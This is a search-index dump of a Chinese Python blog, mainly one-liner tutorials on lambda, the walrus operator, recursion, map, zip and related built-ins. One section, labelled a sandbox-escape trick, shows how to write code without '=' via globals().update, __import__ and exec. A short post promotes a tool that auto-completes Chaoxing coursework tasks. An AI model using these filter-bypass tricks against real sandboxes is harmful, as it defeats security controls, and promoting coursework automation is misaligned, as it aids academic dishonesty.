[{"body":"","link":"https://jackgdn.github.io/","section":"","tags":null,"title":""},{"body":"","link":"https://jackgdn.github.io/categories/","section":"categories","tags":null,"title":"Categories"},{"body":"","link":"https://jackgdn.github.io/post/","section":"post","tags":null,"title":"Posts"},{"body":"","link":"https://jackgdn.github.io/tags/python/","section":"tags","tags":null,"title":"Python"},{"body":"","link":"https://jackgdn.github.io/categories/python/","section":"categories","tags":null,"title":"Python"},{"body":"前面两篇笔记里介绍的内容都不过是开胃小菜，这一篇笔记里记录的才是硬菜，写一句话代码时真正实用的技巧。\nlambda 匿名函数 lambda 关键字的用法如下 lambda [parameters]: expression，其中 expression 的结果直接作为返回值。这一结构决定了：\nlambda 定义的匿名函数中只能有一个表达式 lambda 定义的匿名函数一定有返回值 下面是一个 lambda 的使用示例： 1print(list(map(lambda x: x + 1, [1, 1, 4, 5, 1, 4]))) 2 3# output: [2, 2, 5, 6, 2, 5] lambda函数经常与 map() 函数及其他需要以函数作为为参数的函数共同使用，用于提高代码的简洁性与灵活性。因为 lambda 会创建一个函数，这个匿名函数也可以使用常规的 function([parameters]) 的方式调用：\n1print((lambda x: [i + 1 if i % 2 else i for i in x])([1, 1, 4, 5, 1, 4])) 2 3# output: [2, 2, 4, 6, 2, 4] 在上面这个例子中，x 为匿名函数的形式参数，后面的列表 [1, 1, 4, 5, 1, 4] 是传入函数的实际参数。\n另外，尽管 PEP8 标准不建议将 lambda 创建的匿名函数作为一个“右值”，但是这样做并不算是语法错误。就像下面这样：\n1f = lambda x, n: x ** n 2print(f(3, 3)) 3 4# output: 27 这段代码就相当于\n1def f(x, n): 2\treturn x ** n 3 4print(f(3, 3)) 5 6# output: 27 前文提到，lambda 创建的匿名函数有两条限制，即只能有一条表达式和一定有返回值。但是实际上，这两条限制可以使用一些部分技巧规避掉。在 Python 中，如果有多条表达式被放到一个元组中，那么这些表达式会被依次执行。\n1S = (lambda s: (print(s.lower()), s.upper())[-1])(\u0026#34;JackGDN\u0026#34;) 2print(S) 3 4# output: 5# jackgdn 6# JACKGDN 在上面这个例子中，print(s.lower()) 和 s.upper() 这两个表达式被依次放置于一个元组中，因此这两条语句会被依次执行，而这个匿名函数的返回值为元组的最后一个元素，即 s.upper() 的计算结果。通过这个方法，我们可以实现将多条表达式放进一个匿名函数中。在另一些情况中，我们不需要函数有返回值（例如 __init__() 方法），也可以使用类似的结构。\n1lst = [1, 2, 3] 2(lambda lst: (print(lst), lst.append(4), None)[-1])(lst) 3print(lst) 4 5# output: 6# [1, 2, 3] 7# [1, 2, 3, 4] 只需将最后的返回值设为 None 即可。\n通过 lambda 匿名函数，配合在前文中了解到的内容，我们可以解决一些有趣的问题。\n从键盘输入一个n，代表方阵的阶，依次读入n行由空格和数字字符组成的字符串，将字符串中的每个数字字符转换成整形数据，存成方阵的一行，如果输入的数字字符数目少于n个，以0补足，如果超过n个，截取前n位。输出该方阵与其转置矩阵相乘后得到的新矩阵。 example: input: 5 3 2 1 7 6 8 11 2 4 12 5 4 3 1 7 6 5 1 output: [[99, 155, 19, 38, 3], [155, 310, 54, 109, 11], [19, 54, 26, 51, 4], [38, 109, 51, 110, 7], [3, 11, 4, 7, 1]]\n这道题的一行代码写法如下：\n1( 2 lambda order: print( 3 *list( 4 map( 5 lambda matrix: [ 6 [ 7 sum([a * b for a, b in zip(matrix[i], matrix[j])]) 8 for j in range(order) 9 ] 10 for i in range(order) 11 ], 12 [ 13 [ 14 list(list(map(int, input().strip().split(\u0026#34; \u0026#34;))) + [0] * order)[ 15 :order 16 ] 17 for _ in range(order) 18 ] 19 ], 20 ) 21 ) 22 ) 23)(int(input())) 使用递归实现 while 循环 一切 while 循环都能够改写为递归形式。因为 while 循环不支持一行写法，因此只能通过函数递归调用，并结合 lambda 实现一行写法。例如说：\n1index = 0 2summ = 0 3lst = [1, 1, 4, 5, 1, 4, 1, 9, 1, 9, 8, 10] 4while index \u0026lt; len(lst) and summ \u0026lt; 33: 5\tsumm += lst[index] 6\tindex += 1 7print(summ) 8 9# output: 36 将这个 while 循环改写为递归函数，就可以得到下面的代码：\n1def recursive_sum(lst=[1, 1, 4, 5, 1, 4, 1, 9, 1, 9, 8, 10], index=0, summ=0): 2\tif summ \u0026gt;= 33 or index \u0026gt;= len(lst): 3\treturn summ 4\telse: 5\treturn recursive_sum(lst, index + 1, summ + lst[index]) 6print(recursive_sum()) 7 8# output: 36 随后将 if 语句改写为一个三元运算符：\n1def recursive_sum(lst=[1, 1, 4, 5, 1, 4, 1, 9, 1, 9, 8, 10], index=0, summ=0): 2\treturn summ if summ \u0026gt;= 33 or index \u0026gt;= len(lst) else recursive_sum(lst, index + 1, summ + lst[index]) 3print(recursive_sum()) 4# output: 36 最后使用 lambda 就可以将这些内容写进一行了。\n1print((recursive := lambda lst=[1, 1, 4, 5, 1, 4, 1, 9, 1, 9, 8, 10], index=0, summ=0: summ if summ \u0026gt;= 33 or index \u0026gt;= len(lst) else recursive_sum(lst, index + 1, summ + lst[index]))()) 2 3# output: 36 不过需要注意，Python3 默认的递归深度为 1000。虽然这个限制可以通过 sys.setrecursionlimit()函数修改，但是太多层递归函数很有可能把你的 CPU 干破防（物理）。\n这里出现了一个奇怪的 := ，这就是接下来要提到的海象运算符。\n海象运算符 Python 中的代码有语句与表达式之分。一般来说，表达式可以被计算为一个值，而语句则用于执行每一个操作。例如说，3 \u0026gt; 1、{1, 2} | {2, 3} 是表达式，因为这他们分别可以被计算为 True 和 {1, 2, 3}。而 if 3 \u0026gt; 1 则是条件语句，a = {1, 2} | {2, 3} 是赋值语句。\n前文提到，将多个表达式翻到一个元组中，这些表达式会依次执行。而海象运算符，就是将赋值语句变成赋值表达式执行。因此，海象运算符有以下使用场景：\n1for i in range(num := 3): 2\tprint(i, num) 3 4# outut: 5# 0 3 6# 1 3 7# 2 3 或者\n1import random 2print(num if (num := random.randint(-5, 5)) \u0026gt; 0 else 0) # 注意海象运算符使用的位置，并且一定加括号 3 4# output：2 对于“一行代码”来说，最有用的还是放到 lambda 中执行：\n1print((lambda x: (print(x), x := x + 4)[-1])(3)) 2 3# output: 4# 3 5# 7 目前来说，海象运算符有诸多限制：\n只能在 Python 3.8 及更高版本使用 不能直接当做赋值语句 不能重载（和等号一样） 不能写到推导式里，a = [i for i in range(x := 3)] 错！ 不能用于给可迭代对象的切片赋值，a[3] := 3 错！ 不能用于给类的属性赋值，myClass.myAttribute := 3 错！ 不能直接写到 lambda 匿名函数里，lambda x: x := 3 错！应该写成 lambda x: (x := 3) 这样写到元组里。这不是因为没加括号导致的语法解析错误，单纯是因为不能直接把赋值表达式写进匿名函数。 假如没有等号……（这是一个沙箱逃逸技巧） 前文提到，海象运算符在 Python 3.8 中加入。如果没有海象运算符，那么应该怎么办呢？我不禁思考，如果赋值不需要等号，那么岂不是写 Python 代码就不需要等号了？在使用 Python 写代码时，有以下情况会使用到 = 这个字符：\n赋值运算符，=、+=、-=、*=、/=、**=、//= 和 %= 比较运算符，==、\u0026gt;=、\u0026lt;=、!= 海象运算符，:= 字符串 定义带有默认值参数的函数 调用带有默认值参数或关键字参数的函数 我们将这些等号按照从易到难的顺序逐条去除。\n海象运算符 不用海象运算符就好了，毕竟你也不会用到的。海象运算符的最大贡献就是将赋值语句变成了赋值表达式，而下面我会介绍另一种通过调用函数和方法的表达式取代赋值运算符的方法。\n字符串 等号的 ASCII 码为 61，只需要将字符串中所有需要等号的部分使用 chr(61) 替代即可。\n比较运算符 既然比较运算符都是可以重载的，那么我不妨直接使用魔法方法 __eq__()、__ge__()、__le__() 和 __ne__() 取代四种带有等号的比较运算符。\n调用带有默认值参数和关键字参数的函数 调用这两种函数时，需要将格式类似于 parameter=value 的参数传入。在 Python 中，可以将字典解包得到这种参数和值的对应关系。例如执行 sorted([1, 3, 2, 4], **{'reverse': True}) 这行代码就可以得到 [4, 3, 2, 1] 的结果。\n定义带有默认值参数的函数 目前来说，这里出现的等号没有合适的办法去除，因为函数定义的时候不能使用解包字典的操作，换句话说，使用等号是定义默认值参数的唯一方法。对于这个问题比较好的解决方法是，不要使用默认值参数，而是使用可变参数 *args 和关键字参数 **kwargs 替代。\n赋值运算符 赋值运算符不可以被重载，但是有别的办法避免使用等号赋值。首先需要说明的是，和海象运算符一样，+=、-=、*=、/=、//=、**= 和 %= 都是“非必须”的，即他们都可以使用 = 替代，这样我们唯一需要思考的就是替换掉单独的 =。Python 中提供了两个内置函数 globals() 和 locals()，这两个函数的返回值分别为存储全局变量和局部变量的字典。因此想要进行依次赋值运算，只需更新字典的内容。例如我想定义 a = 3，就可以使用 globals().update({'a': 3}) 来规避等号。此外，在一个类中，所有的属性都存储在 __dict__ 属性中，使用 self.__dict__.update({'a': 3}) 来取代 self.a = 3。\n想要去除等号，有一种终极方法，就是使用 exec() 函数 ;=)\n__setitem__() 与 __getitem__() 函数 刚才提到了不使用等号完成赋值操作的方法，但是上面那种方法也有问题。例如对于下面这段代码：\n1lst = [1, 1, 4, 5, 1, 4] 2for i, num in enumerate(lst): 3\tif num % 2: 4\tlst[i] += 1 5print(lst) 6 7# output: [2, 2, 4, 6, 2, 4] 我们试着一行行将上面这段代码中的等号去除。\n1globals().update({\u0026#39;lst\u0026#39;: [1, 1, 4, 5, 1, 4]}) 2for i, num in enumerate(lst): 3\tif num % 2: 4\t... 不对，我们是要修改 lst 的第 i 个值，必须要精确定位到这个位置，那么再使用 globals().update() 就显得力不从心了。于是有了 __getitem__() 方法和 __setitem__() 方法。这两个方法是用于实现切片功能的，例如 lst[i] = lst[i] + 1 实际上执行的是 lst.__setitem__(i, lst.__getitem__(i) + 1)。因此将上面那段代码补全之后就是\n1globals().update({\u0026#39;lst\u0026#39;: [1, 1, 4, 5, 1, 4]}) 2for i, num in enumerate(lst): 3\tif num % 2: 4\tlst.__setitem__(i, num + 1) 5print(lst) 6 7# output: [2, 2, 4, 6, 2, 4] 前文还提到，海象运算符“不能用于给可迭代对象的切片赋值”，所以我们不妨用 a.__setitem__(3, 3) 来取代 a[3] := 3。\nsetattr() 与 getattr() 函数 前文提到，globals() 和 locals() 函数分别以字典形式返回 Python 的全局变量和局部变量。那么问题来了，一个类中的属性应该存储到那里呢？\n答案是，以上两个都不是。基类 object 中有一个 __dict__ 属性，类中所有的属性（除了它自己）都会以字典形式存储在这个 __dict__ 属性中。因此使用 myObject.__dict__.update({'value': myObject.__dict__['value'] + 1}) 替代 myObject.value += 1 是可行的……\n不过我们有更简便的方法，及使用 setattr() 函数与 getattr() 函数。例如 setattr(myObject, 'value', getattr(myObject, 'value', -1) + 1)（getattr() 函数的第三个参数为默认值，当类中不存在某个属性时则返回该默认值，可省略）就可以用来取代 myObject.value = myObject.value + 1 if hasattr(myObject, 'value') else 0\n同理，使用 setattr() 函数和 getattr() 函数也可以解决海象运算符无法对属性赋值的问题。\n此外，setattr() 函数也可以动态向类中添加方法，这一点我们未来会在描述符协议中再提。\ntype() 函数动态创建类 大多数人都知道使用 class 关键字可以创建类，也知道 type() 函数可以用于查看对象类型，但是不知道 type() 函数同样可以创建类。type() 函数创建类的语法如下：\n1class type(name: str, bases: tuple, dict: dict, **kwds: dict) 其中 name 类的名称，bases 为继承的父类，dict 为类的属性和方法，*kwds 为额外参数，一般只有在定义元类时才会使用（使用 class 关键字定义一个类时也有这个参数，大多数情况下，直接继承自元类 type 时才会使用这个参数）。\n使用示例：\n1class A: 2 3\tdef __init__(self, value): 4\tself.value = value + 1 5 6\tdef echo(self): 7\tprint(self.value) 8 9 10a = A(int(input())) 11a.echo() 12 13# input: 13 14# output: 14 就可以写成\n1(lambda A: A(int(input())).echo())( 2 type( 3 \u0026#34;A\u0026#34;, 4 (object,), 5 { 6 \u0026#34;__init__\u0026#34;: lambda self, value: setattr(self, \u0026#34;value\u0026#34;, value + 1), 7 \u0026#34;echo\u0026#34;: lambda self: print(self.value), 8 }, 9 ) 10) # 这其实是一行代码，为了直观展现其结构，将其格式化。 11 12# input: 13 13# output: 14 名称重整机制 在我初学 Python 时，老师便告诉我们，在定义类时，在属性或者方法名前加两条下划线，就可以将其定义为私有属性/方法，无法在外部访问。但是事实真的如此吗？请看下面的代码：\n1class AClass: 2 3 def __init__(self, value): 4 self.__value = value 5 6 def __echo(self): 7 print(self.__value) 8 9 10a = AClass(10) 11a._AClass__value = 20 12a._AClass__echo() 13 14 15# output: 20 a 中的私有属性 __value 被从外部修改了，__echo() 方法也能够从外部调用，原因就是 Python 会将类中的私有方法和私用重命名成类似于上面 _AClass__value、_AClass__echo() 的样子。\n__import__() 函数动态导入模块 __import__() 函数可以动态导入库，能够用于取代独占一行的 import 关键字。该函数的定义如下：\n1__import__(name: str, globals: dict=None, locals: dict=None, fromlist: list=(), level: int=0) 该函数的返回值为模块对象。一般情况下，我们只会用到 name 参数，使用方法为 __import__('time').time()。\n使用生成器对象的 throw() 方法取代 raise 关键字 如果你想 raise 一个异常，但又不想多占用一行，就可以写一个 (_ for _ in ()).throw(Exception)，前面的推导式可随意填写。不过 try-except-finally 的异常处理语句目前还没有办法压缩至一行。\n实战训练：\n将这段代码压缩进一行：\n1def binary_search(numbers, value): 2 max_index = len(numbers) - 1 3 min_index = 0 4 while min_index \u0026lt;= max_index: 5 mid_index = (min_index + max_index) // 2 6 if numbers[mid_index] == value: 7 return mid_index 8 elif numbers[mid_index] \u0026lt; value: 9 min_index = mid_index + 1 10 else: 11 max_index = mid_index - 1 12 return -1 13 14 15numbers = [10, 15, 20, 27, 41, 69] 16print(binary_search(numbers, 69)) 17 18numbers = [13, 18, 54, 61, 78, 93] 19print(binary_search(numbers, 10)) 20 21# output: 22# 5 23# -1 首先将 while 循环改写为一个递归函数：\n1def binary_search(numbers, value): 2 max_index = len(numbers) - 1 3 min_index = 0 4 5 def my_while(min_index, max_index, numbers, value): 6 if min_index \u0026lt;= max_index: 7 mid_index = (min_index + max_index) // 2 8 if numbers[mid_index] == value: 9 return mid_index 10 elif numbers[mid_index] \u0026lt; value: 11 return my_while(mid_index + 1, max_index, numbers, value) 12 else: 13 return my_while(min_index, mid_index - 1, numbers, value) 14 else: 15 return -1 16 17 res = my_while(min_index, max_index, numbers, value) 18 return res 19 20 21numbers = [10, 15, 20, 27, 41, 69] 22print(binary_search(numbers, 69)) 23 24numbers = [13, 18, 54, 61, 78, 93] 25print(binary_search(numbers, 10)) 随后将这个递归函数压缩至一行：\n1def binary_search(numbers, value): 2 max_index = len(numbers) - 1 3 min_index = 0 4 5 my_while = lambda min_index, max_index, numbers, value: ( 6 -1 7 if min_index \u0026gt; max_index 8 else ( 9 (min_index + max_index) // 2 10 if numbers[(min_index + max_index) // 2] == value 11 else ( 12 my_while((min_index + max_index) // 2 + 1, max_index, numbers, value) 13 if numbers[(min_index + max_index) // 2] \u0026lt; value 14 else my_while( 15 min_index, (min_index + max_index) // 2 - 1, numbers, value 16 ) 17 ) 18 ) 19 ) 20 21 res = my_while(min_index, max_index, numbers, value) 22 return res 23 24 25numbers = [10, 15, 20, 27, 41, 69] 26print(binary_search(numbers, 69)) 27 28numbers = [13, 18, 54, 61, 78, 93] 29print(binary_search(numbers, 10)) 随后再将整个 binary_search() 函数体压缩为一行：\n1def binary_search(numbers, value): 2 3 return ( 4 my_while := lambda min_index, max_index, numbers, value: ( 5 -1 6 if min_index \u0026gt; max_index 7 else ( 8 (min_index + max_index) // 2 9 if numbers[(min_index + max_index) // 2] == value 10 else ( 11 my_while( 12 (min_index + max_index) // 2 + 1, max_index, numbers, value 13 ) 14 if numbers[(min_index + max_index) // 2] \u0026lt; value 15 else my_while( 16 min_index, (min_index + max_index) // 2 - 1, numbers, value 17 ) 18 ) 19 ) 20 ) 21 )(0, len(numbers) - 1, numbers, value) 22 23 24numbers = [10, 15, 20, 27, 41, 69] 25print(binary_search(numbers, 69)) 26 27numbers = [13, 18, 54, 61, 78, 93] 28print(binary_search(numbers, 10)) 最后一步，将函数内外全部压缩为一行：\n1print( 2 *list( 3 ( 4 lambda numbers, value: ( 5 ( 6 my_while := lambda min_index, max_index, numbers, value: ( 7 -1 8 if min_index \u0026gt; max_index 9 else ( 10 (min_index + max_index) // 2 11 if numbers[(min_index + max_index) // 2] == value 12 else ( 13 my_while( 14 (min_index + max_index) // 2 + 1, 15 max_index, 16 numbers, 17 value, 18 ) 19 if numbers[(min_index + max_index) // 2] \u0026lt; value 20 else my_while( 21 min_index, 22 (min_index + max_index) // 2 - 1, 23 numbers, 24 value, 25 ) 26 ) 27 ) 28 ) 29 )(0, len(numbers) - 1, numbers, value) 30 ) 31 )(numbers, value) 32 for numbers, value in [ 33 ([10, 15, 20, 27, 41, 69], 69), 34 ([13, 18, 54, 61, 78, 93], 10), 35 ] 36 ), 37 sep=\u0026#34;\\n\u0026#34;, 38) 39 40# output: 41# 5 42# -1 我们不妨再尝试将等号去掉：\n1print( 2 *list( 3 ( 4 lambda numbers, value: ( 5 globals().update( 6 { 7 \u0026#34;binary_search\u0026#34;: lambda numbers, value: ( 8 ( 9 binary_search.__dict__.update( 10 { 11 \u0026#34;my_while\u0026#34;: lambda min_index, max_index, numbers, value: ( 12 -1 13 if min_index \u0026gt; max_index 14 else ( 15 (min_index + max_index) // 2 16 if numbers[ 17 (min_index + max_index) // 2 18 ].__eq__(value) 19 else ( 20 binary_search.my_while( 21 (min_index + max_index) // 2 22 + 1, 23 max_index, 24 numbers, 25 value, 26 ) 27 if numbers[ 28 (min_index + max_index) // 2 29 ] 30 \u0026lt; value 31 else binary_search.my_while( 32 min_index, 33 (min_index + max_index) // 2 34 - 1, 35 numbers, 36 value, 37 ) 38 ) 39 ) 40 ) 41 } 42 ) 43 ), 44 binary_search.my_while(0, len(numbers) - 1, numbers, value), 45 )[-1] 46 } 47 ), 48 binary_search(numbers, value), 49 )[-1] 50 )(numbers, value) 51 for numbers, value in [ 52 ([10, 15, 20, 27, 41, 69], 69), 53 ([13, 18, 54, 61, 78, 93], 10), 54 ] 55 ), 56 **{\u0026#34;sep\u0026#34;: \u0026#34;\\n\u0026#34;} 57) 58 59# output: 60# 5 61# -1 之所以在 binary_search() 函数内不使用 locals().update()，而是使用 binary_search.__dict__.update() 创建 my_while 函数，是因为 locals() 具有不可修改性，即在任何情况下， locals().update() 都是无效的。 在 my_while 函数中，使用 binary_search.my_while() 来调用函数是因为在使用 binary_search.__dict__.update() 创建 my_while 函数时，my_while 被定义为了 binary_search 这个函数对象的一个属性/方法。 ","link":"https://jackgdn.github.io/post/python-%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%BB%A3%E7%A0%81-pt-3/","section":"post","tags":["Python"],"title":"Python 一句话代码技巧（三）"},{"body":"","link":"https://jackgdn.github.io/series/python-%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81/","section":"series","tags":null,"title":"Python 一行代码"},{"body":"","link":"https://jackgdn.github.io/series/","section":"series","tags":null,"title":"Series"},{"body":"","link":"https://jackgdn.github.io/tags/","section":"tags","tags":null,"title":"Tags"},{"body":"","link":"https://jackgdn.github.io/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","section":"categories","tags":null,"title":"学习记录"},{"body":"过去一星期，我开发了一个名为 chaoxing-GUI 的项目，并将其上传至 Github。这个项目基于 Github 上的 Samueli924/chaoxing 项目开发。原项目的描述为“超星学习通自动化完成任务点(命令行版)”，而我在这个命令行程序基础上，使用 PySide6 模块为其添加了图形化的界面。目前程序的功能较为单一，我会在后续更新中，逐步合并原项目中程序提供的功能。\n项目的详细信息可见 README 文档。\n","link":"https://jackgdn.github.io/post/chaoxing-gui/","section":"post","tags":["Python"],"title":"超星学习通自动化完成任务点（GUI 版）项目介绍"},{"body":"使用 sum() 函数或 list.count() 方法统计数量 sum() 函数的常规用法是求一个可迭代对象里面各元素的和（如果可求和的话）。当然，如果我们对一个只有 1 和 0 的列表求和，那么就可以求出列表中 1 的数量。根据这个思路，我们可以先将待处理的列表转换为一个仅存储布尔值的列表，再对其求和，就可以统计出其中满足条件元素的数量。例如还是上一篇文章中的例子：\n1value = 7 2count = 0 3lst = [1, 1, 4, 5, 1, 4, 1, 9, 1, 9, 8, 10] 4for i in lst: 5 if i \u0026gt; value: 6 count += 1 7print(count) 8 9# output: 4 我们结合推导式创建一个新的列表，将满足条件的存储为 1，这样再求和。\n1print(sum(1 if i \u0026gt; 7 else 0 for i in [1, 1, 4, 5, 1, 4, 1, 9, 1, 9, 8, 10])) 2# 如果只有 if 语句，则将 if 语句放到 for 后。如果是 if-else 三元表达式，则将 if-else 前置。 3# 也可以写成 4print([1 for i in [1, 1, 4, 5, 1, 4, 1, 9, 1, 9, 8, 10] if i \u0026gt; 7].count(1)) 5# 或者 6print(len([1 for i in [1, 1, 4, 5, 1, 4, 1, 9, 1, 9, 8, 10] if i \u0026gt; 7])) 7 8# output: 4 map() 函数 map() 函数的定义为 map(func, *iterables) --\u0026gt; map boject，该函数将一个可变对象中的每一个元素传入函数中做操作，并将每一个返回值存储到一个 map 对象中，这个 map 对象可以被转换为一个新的可迭代对象，也可以将其作为参数传给其他接受迭代器的函数。\n下面这行代码示例可以将输入的内容转化为整形并存储到列表中\n1result = list(map(int, input().split(\u0026#39; \u0026#39;))) 再例如下面这个例子，统计字符串中不重复的英文字符：\n1print(set(map(str.upper, \u0026#34;Hello, World!\u0026#34;))) 2 3# output: {\u0026#39;L\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;!\u0026#39;, \u0026#39;E\u0026#39;, \u0026#39;R\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;H\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;W\u0026#39;, \u0026#39;,\u0026#39;} 求平方数：\n1def suqare(n): 2\treturn n ** 2 3 4print(sorted(map(square, [4, 3, 2, 5]))) 5 6# output: [4, 9, 16, 25] zip() 函数 zip() 函数可以依次将多个可迭代对象合并到元组，并返回一个 zip 对象。zip 对象可以被转换为列表、字典、元组、集合。\n1print(list(zip([\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;], [1, 2, 3], [\u0026#39;A\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;C\u0026#39;]))) 2 3# output: [(\u0026#39;a\u0026#39;, 1, \u0026#39;A\u0026#39;), (\u0026#39;b\u0026#39;, 2, \u0026#39;B\u0026#39;), (\u0026#39;c\u0026#39;, 3, \u0026#39;C\u0026#39;)] 将数据打包成字典：\n1keys = [\u0026#39;name\u0026#39;, \u0026#39;age\u0026#39;] 2values = [\u0026#39;Jane Doe\u0026#39;, \u0026#39;18\u0026#39;] 3print(dict(zip(keys, values))) 4 5# output: {\u0026#39;name\u0026#39;: \u0026#39;Jane Doe\u0026#39;, \u0026#39;age\u0026#39;: \u0026#39;18\u0026#39;} 该函数还能够便捷求出矩阵的转置：\n1matrix = [ 2\t[1, 2, 3], 3\t[4, 5, 6], 4\t[7, 8, 9] 5] 6 7print(*map(list, zip(*matrix)), sep=\u0026#39;\\n\u0026#39;) 8 9\u0026#34;\u0026#34;\u0026#34; 10output: 11[1, 4, 7] 12[2, 5, 8] 13[3, 6, 9] 14\u0026#34;\u0026#34;\u0026#34; 使用 enumerate() 函数简化 for 循环 enumerate() 函数定义是 enumerate(iterable, start=0)，该函数可以用更便捷的方法于创建迭代器，在某些情境下优于 range() 函数。例如说，一个经典的 for 循环写法如下：\n1codes = [\u0026#39;alpha\u0026#39;, \u0026#39;bravo\u0026#39;, \u0026#39;charlie\u0026#39;] 2i = 0 3for code in codes: 4\tprint(i, code) 5\ti += 1 6 7\u0026#34;\u0026#34;\u0026#34; 8output: 90 alpha 101 bravo 112 charlie 12\u0026#34;\u0026#34;\u0026#34; 使用 enumerate() 可以简化这段代码：\n1codes = [\u0026#39;alpha\u0026#39;, \u0026#39;bravo\u0026#39;, \u0026#39;charlie\u0026#39;] 2for i, code in enumerate(codes): 3\tprint(i, code) 4 5\u0026#34;\u0026#34;\u0026#34; 6output: 70 alpha 81 bravo 92 charlie 10\u0026#34;\u0026#34;\u0026#34; 或者直接简化成一行：\n1print(*[f\u0026#34;{i} {code}\u0026#34; for i, code in enumerate([\u0026#39;alpha\u0026#39;, \u0026#39;bravo\u0026#39;, \u0026#39;charlie\u0026#39;])], sep=\u0026#39;\\n\u0026#39;) 2 3\u0026#34;\u0026#34;\u0026#34; 4output: 50 alpha 61 bravo 72 charlie 8\u0026#34;\u0026#34;\u0026#34; 可以使用 enumerate() 函数创建带有序号的字典：\n1print(dict(enumerate([\u0026#34;Spring\u0026#34;, \u0026#34;Summer\u0026#34;, \u0026#34;Autumn\u0026#34;, \u0026#34;Winter\u0026#34;], start=1))) 2 3# output: {1: \u0026#39;Spring\u0026#39;, 2: \u0026#39;Summer\u0026#39;, 3: \u0026#39;Autumn\u0026#39;, 4: \u0026#39;Winter\u0026#39;} 或者配合 zip() 函数在循环中添加更多内容：\n1performers = [\u0026#34;Alice\u0026#34;, \u0026#34;Bob\u0026#34;, \u0026#34;Charles\u0026#34;, \u0026#34;Daniel\u0026#34;] 2performances = [\u0026#34;Singing\u0026#34;, \u0026#34;Dancing\u0026#34;, \u0026#34;Rapping\u0026#34;, \u0026#34;Basketball Showcase\u0026#34;] 3for i, (performer, performance) in enumerate(zip(performers, performances), start=1): 4\tprint(\u0026#34;Sequence: {:02} Performer: {} Performance: {}\u0026#34;.format(i, performer, performance)) 5 6\u0026#34;\u0026#34;\u0026#34; 7output: 8Sequence: 01 Performer: Alice Performance: Singing 9Sequence: 02 Performer: Bob Performance: Dancing 10Sequence: 03 Performer: Charles Performance: Rapping 11Sequence: 04 Performer: Daniel Performance: Basketball Showcase 12\u0026#34;\u0026#34;\u0026#34; next() 函数快速匹配内容 next() 函数的用法如下：\n1it = iter(range(1, 5)) 2while True: 3\tx = next(it, False) 4\tprint(x) 5\tif not x: 6\tbreak 7 8\u0026#34;\u0026#34;\u0026#34; 9output: 101 112 123 134 14False 15\u0026#34;\u0026#34;\u0026#34; 如果不给 next() 传入第二个参数，也可以使用 StopIteration 终止循环。\n1it = iter(range(1, 5)) 2while True: 3\ttry: 4\tx = next(it) 5\tprint(x) 6\texcept StopIteration: 7\tbreak 8 9\u0026#34;\u0026#34;\u0026#34; 10output: 111 122 133 144 15\u0026#34;\u0026#34;\u0026#34; 例如说，我们想要在下面的列表中找到第一个符合要求的内容，就可以用 next() 函数。\n1names = [\u0026#34;Alice\u0026#34;, \u0026#34;Bob\u0026#34;, \u0026#34;Charles\u0026#34;] 2scores = [80, 90, 100] 3data = zip(names, scores) 4print(next((i for i in data if i[1] == 100), None)) 5 6# output: (\u0026#39;Charles\u0026#39;, 100) 如果在可迭代对象中有多个元素符合条件，则 next() 函数会找出第一个符合条件的元素。\n1names = [\u0026#34;Alice\u0026#34;, \u0026#34;Bob\u0026#34;, \u0026#34;Charles\u0026#34;] 2scores = [80, 90, 100] 3data = zip(names, scores) 4print(next((i for i in data if i[1] \u0026gt; 80), None)) 5print(next((i for i in data if i[1] \u0026gt; 80), None)) 6print(next((i for i in data if i[1] \u0026gt; 80), None)) 7print(next((i for i in data if i[1] \u0026gt; 80), None)) 8 9\u0026#34;\u0026#34;\u0026#34; 10output: 11(\u0026#39;Bob\u0026#39;, 90) 12(\u0026#39;Charles\u0026#39;, 100) 13None 14None 15\u0026#34;\u0026#34;\u0026#34; 不难发现，next() 函数每次输出的内容都是建立在上一个 next() 函数执行结果之后的，也就是说每次 next() 是对同一个可迭代对象操作。如果像每次都输出相同内容，可以将 zip 对象转化为列表：\n1names = [\u0026#34;Alice\u0026#34;, \u0026#34;Bob\u0026#34;, \u0026#34;Charles\u0026#34;] 2scores = [80, 90, 100] 3data = list(zip(names, scores)) 4print(next((i for i in data if i[1] \u0026gt; 80), None)) 5print(next((i for i in data if i[1] \u0026gt; 80), None)) 6 7# output: 8# (\u0026#39;Bob\u0026#39;, 90) 9# (\u0026#39;Bob\u0026#39;, 90) 或者使用一个生成可迭代对象的函数：\n1def my_generator(): 2\tnames = [\u0026#34;Alice\u0026#34;, \u0026#34;Bob\u0026#34;, \u0026#34;Charles\u0026#34;] 3\tscores = [80, 90, 100] 4\tdata = zip(names, scores) 5\tfor i in data: 6\tif i[1] \u0026gt; 80: 7\tyield i 8 9print(next(my_generator(), None)) 10print(next(my_generator(), None)) 11 12# output: 13# (\u0026#39;Bob\u0026#39;, 90) 14# (\u0026#39;Bob\u0026#39;, 90) next() 的执行效率高于循环，在日常编程中该函数也是不二之选。\nfilter() 快速筛选 上面 next() 函数一次只能返回一个元素，而 filter() 函数会一次性返回所有符合条件的元素\n1def f(x): 2\treturn x \u0026gt; 7 3 4print(tuple(filter(f, [1, 1, 4, 5, 1, 4, 1, 9, 1, 9, 8, 10]))) 5 6# output: (9, 9, 8, 10) 1def f(x): 2\treturn x[1] \u0026gt; 80 3 4names = [\u0026#34;Alice\u0026#34;, \u0026#34;Bob\u0026#34;, \u0026#34;Charles\u0026#34;] 5scores = [80, 90, 100] 6data = dict(zip(names, scores)) 7print(list(filter(f, data.items()))) 8 9# output: [(\u0026#39;Bob\u0026#39;, 90), (\u0026#39;Charles\u0026#39;, 100)] any() 与 all() 这两个函数接收可迭代对象作为参数，如果可迭代对象中有任意一个元素的布尔值为 True，则 any() 函数返回 True；如果可迭代对象中每一个元素的布尔值都为 True，则 all() 函数返回 True。\n1print(any([\u0026#34;\u0026#34;, [], (), None])) # 这些对象的布尔值都是 False 2print(any([\u0026#34;Hello\u0026#34;, [1, 1, 4, 5, 1, 4], False])) 3 4# output: 5# False 6# True 1print(all([{True, False}, True])) 2print(all([\u0026#39;A\u0026#39;, False])) 3 4# output: 5# True 6# False 